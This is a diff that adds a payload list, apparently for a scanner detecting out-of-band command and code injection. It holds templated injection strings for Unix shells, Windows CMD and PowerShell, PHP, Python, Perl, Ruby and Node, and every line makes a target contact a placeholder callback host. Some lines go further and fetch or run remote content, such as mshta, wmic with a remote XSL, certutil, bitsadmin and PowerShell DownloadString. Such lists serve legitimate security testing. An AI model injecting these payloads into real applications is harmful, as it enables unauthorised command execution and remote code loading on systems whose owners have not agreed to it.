@@ -1,0 +1,61 @@
+[PREFIX][CONCAT]curl http://[OOB_HOST]:8001[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]wget -qO- http://[OOB_HOST]:8001[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]nslookup [OOB_HOST][SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]ping -c 1 [OOB_HOST][SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]dig [OOB_HOST][SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+
+${system(print(`curl http://[OOB_HOST]:8001`))[SUFFIX]::: oob::: High::: Unix::: PHP
+${exec(print(`wget -qO- http://[OOB_HOST]:8001`))[SUFFIX]::: oob::: High::: Unix::: PHP
+${shell_exec(print(`nslookup [OOB_HOST]`))[SUFFIX]::: oob::: High::: Unix::: PHP
+[PREFIX][CONCAT]}print(`curl http://[OOB_HOST]:8001`)[SUFFIX]::: oob::: High::: Unix::: PHP
+[PREFIX]print(`wget -qO- http://[OOB_HOST]:8001`)[SUFFIX]::: oob::: High::: Unix::: PHP
+[PREFIX][CONCAT]print(`nslookup [OOB_HOST]`)[SUFFIX]::: oob::: High::: Unix::: PHP
+[PREFIX][CONCAT]file_get_contents('http://[OOB_HOST]:8001')[SUFFIX]::: oob::: High::: Unix::: PHP
+
+[PREFIX][CONCAT]nslookup [OOB_HOST][SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]ping -n 1 [OOB_HOST][SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]curl http://[OOB_HOST]:8001[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]certutil -urlcache -split -f http://[OOB_HOST]:8001 c:\temp.txt[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+
+[PREFIX][CONCAT]Resolve-DnsName [OOB_HOST][SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (PS)
+[PREFIX][CONCAT]Invoke-WebRequest -Uri http://[OOB_HOST]:8001[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (PS)
+[PREFIX][CONCAT]Invoke-RestMethod -Uri http://[OOB_HOST]:8001[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (PS)
+
+${system(print(`nslookup [OOB_HOST]`))[SUFFIX]::: oob::: High::: Windows::: PHP
+${exec(print(`ping -n 1 [OOB_HOST]`))[SUFFIX]::: oob::: High::: Windows::: PHP
+[PREFIX][CONCAT]}print(`curl http://[OOB_HOST]:8001`)[SUFFIX]::: oob::: High::: Windows::: PHP
+[PREFIX]print(`nslookup [OOB_HOST]`)[SUFFIX]::: oob::: High::: Windows::: PHP
+
+[PREFIX][CONCAT]node -e "require('http').get('http://[OOB_HOST]:8001')"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]node -e "require('dns').lookup('[OOB_HOST]',()=>{})"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+
+[PREFIX][CONCAT]python -c "import urllib.request;urllib.request.urlopen('http://[OOB_HOST]:8001')"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]python3 -c "import urllib.request;urllib.request.urlopen('http://[OOB_HOST]:8001')"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]python -c "import socket;socket.gethostbyname('[OOB_HOST]')"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+
+[PREFIX][CONCAT]perl -e 'use LWP::Simple;get("http://[OOB_HOST]:8001");'[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]perl -e 'gethostbyname("[OOB_HOST]");'[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+
+[PREFIX][CONCAT]ruby -r net/http -e "Net::HTTP.get(URI('http://[OOB_HOST]:8001'))"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+[PREFIX][CONCAT]ruby -r socket -e "Resolv.getaddress('[OOB_HOST]')"[SUFFIX]::: oob::: High::: Unix::: SHELL COMMAND
+
+[PREFIX][CONCAT]fopen('http://[OOB_HOST]:8001', 'r')[SUFFIX]::: oob::: High::: Unix::: PHP
+[PREFIX][CONCAT]stream_socket_client('tcp://[OOB_HOST]:8001')[SUFFIX]::: oob::: High::: Unix::: PHP
+
+[PREFIX][CONCAT]node -e "require('http').get('http://[OOB_HOST]:8001')"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]node -e "require('dns').lookup('[OOB_HOST]',()=>{})"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]python -c "import urllib.request;urllib.request.urlopen('http://[OOB_HOST]:8001')"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]python -c "import socket;socket.gethostbyname('[OOB_HOST]')"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]php -r "file_get_contents('http://[OOB_HOST]:8001');"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+[PREFIX][CONCAT]php -r "gethostbyname('[OOB_HOST]');"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+
+[PREFIX][CONCAT]bitsadmin /transfer n http://[OOB_HOST]:8001/a c:\NUL[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+
+[PREFIX][CONCAT]mshta http://[OOB_HOST]:8001/[MARKER][SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+
+[PREFIX][CONCAT]explorer \\[OOB_HOST]\a[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+
+[PREFIX][CONCAT]wmic os get /FORMAT:"http://[OOB_HOST]:8001/a.xsl"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (CMD)
+
+[PREFIX][CONCAT]powershell -c "(New-Object Net.WebClient).DownloadString('http://[OOB_HOST]:8001')"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (PS)
+[PREFIX][CONCAT]powershell -c "[System.Net.Dns]::GetHostAddresses('[OOB_HOST]')"[SUFFIX]::: oob::: High::: Windows::: SHELL COMMAND (PS)
